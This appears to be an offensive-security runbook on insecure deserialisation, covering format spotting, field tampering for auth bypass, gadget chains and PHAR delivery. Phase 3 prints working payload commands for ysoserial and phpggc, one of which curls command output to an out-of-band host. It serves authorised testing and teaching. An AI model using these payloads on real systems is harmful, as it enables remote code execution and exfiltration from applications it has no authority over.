# Runbook: Insecure deserialisation

When an application rebuilds an object from attacker-controlled bytes, the act of
reconstruction can run code: magic methods fire, gadget chains in the classpath execute, and
a tampered field changes an identity decision. Findings range from a flipped `isAdmin` flag
to full remote code execution. This runbook moves from spotting serialised data to driving a
gadget chain.

## Prerequisites

- Source access where available, since a code review is the most reliable route to the
  deserialisation sink.
- Otherwise, captured traffic with the large opaque blobs that mark serialised objects.
- The right generator for the language: ysoserial for Java, phpggc for PHP.

## Phase 1: Spot serialised data

Look for the formats each language leaves behind:

- PHP: strings like `O:4:"User":2:{...}`, often base64-encoded in a cookie or parameter.
- Java: base64 beginning `rO0AB`, or raw bytes starting `AC ED 00 05`.
- Ruby/Python: base64 blobs, `Marshal`/`pickle` artefacts, YAML where a loader is unsafe.

Decode anything base64 to read the structure. A user-controlled serialised object passed back
to the server is the candidate.

## Phase 2: Tamper without a gadget

The simplest wins need no chain. Modify a field in the serialised object and replay:

- Flip an identity or role field (`isAdmin`, `user_type`) and watch for changed access.
- Change a data type where the language compares loosely, so a strict comparison is dodged
  (PHP comparing a tampered type against an expected string, for instance).
- Point a filename or path field elsewhere to reach a file the object then opens.

## Phase 3: Drive a known gadget chain

Where tampering alone does not pay off, an installed library may carry a gadget chain that
reaches code execution. Generate a payload with the matching tool and deliver it through the
same parameter:

```
# Java, Apache Commons Collections on the classpath
java -jar ysoserial.jar CommonsCollections4 'curl http://COLLAB/$(id|base64)' | base64

# PHP, a framework gadget
phpggc Symfony/RCE4 system 'id' -b
```

ysoserial needs a JDK old enough to expose the gadget classes; Java 11 works where 17 blocks
access. Confirm execution out of band (a Collaborator hit) rather than relying on a visible
response.

## Phase 4: Build a custom chain

Where no off-the-shelf chain fits, assemble one from the classes actually present. Identify
magic methods that run on deserialisation (`__wakeup`, `__destruct` in PHP; `readObject` in
Java), trace a sequence that ends in a dangerous call, and hand-craft the serialised object to
walk it. PHAR deserialisation is the delivery trick worth remembering: a crafted PHAR archive
deserialises its metadata when a file operation touches a `phar://` path, so even an upload or
a filename sink can be the entry point.

## Output

- The serialised object, its language, and the entry point.
- Whether the impact was tamper-only (auth bypass, logic change) or full code execution.
- The gadget chain used, and OOB confirmation of execution.
- A note on blast radius, since deserialisation testing can damage the target if run
  carelessly.

## Techniques

- [Insecure deserialisation](../techniques/id.md)
- [Remote code execution](../techniques/rce.md)

## Counter moves

Runbook: Insecure deserialisation is the variant in play. Not deserialising untrusted input,
type allowlisting where it cannot be avoided, and keeping runtimes patched are the counters.
Seen from the other side, this sits in the blue notes on [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
